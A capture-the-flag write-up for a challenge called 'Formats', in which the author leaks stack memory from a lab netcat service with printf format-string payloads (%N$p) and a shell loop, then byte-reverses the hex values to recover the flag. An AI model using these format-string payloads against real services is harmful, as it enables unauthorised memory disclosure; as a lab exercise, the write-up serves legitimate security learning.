# Formats — CTFkom

I connected to the service with netcat:

```
nc 10.212.172.46 4547
```

It printed:

```
welcome to my chamber of reflection, type something. (type 'q' to quit)
in:
```

The first thing I tried was `%s` format specifiers:

```
in: %1$s.%2$s.%3$s.%4$s.%5$s.%6$s.%7$s.%8$s.%9$s.%10$s
out: .(null).H=.
```

Then I tried `%p` to leak stack values:

```
in: %1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p
out: 0x7fff66ed0cd0.(nil).0x7f09bb6dc887.
```

I entered the same `%p` pattern again and got:

```
in: out: 0x5.(nil).0x2435252e70243425.
in: out: 0x2e702439252e70.0x347b6d6f6b465443.0x7972347237316272.
in: out: 0x775f35643433725f
```

From this I noticed `0x347b6d6f6b465443`. I copied it into CyberChef, decoded *From Hex → To ASCII*, but the output looked backwards. After reversing the byte order in CyberChef it became `CTFkom{4`, which looked like the start of the flag. Doing the same for the other values gave me `rb17r4ry` and `_r34d5_w`.

To see more stack values I ran a bigger loop:

```
{ for i in $(seq 1 120); do printf '%%%d$p.' "$i"; done; printf '\n'; } | nc 10.212.172.46 4547
```

The output showed additional chunks:

```
in: out: 0x775f35643433725f.0x6e3172705f683731.%12
in: out: $p.(nil).(nil).
in: out: 8: 0x347b6d6f6b465443
in: out: 9: 0x7972347237316272
in: out: 10: 0x775f35643433725f
in: out: 11: 0x6e3172705f683731
in: out: 12: 0x7d3f3f6637
```

I copied these values into CyberChef and flipped the byte order for each:

- `0x347b6d6f6b465443` → `CTFkom{4`
- `0x7972347237316272` → `rb17r4ry`
- `0x775f35643433725f` → `_r34d5_w`
- `0x6e3172705f683731` → `17h_pr1n`
- `0x7d3f3f6637` → `7f??}`

Putting them together gave me the full flag:

```
CTFkom{4rb17r4ry_r34d5_w17h_pr1n7f??}
```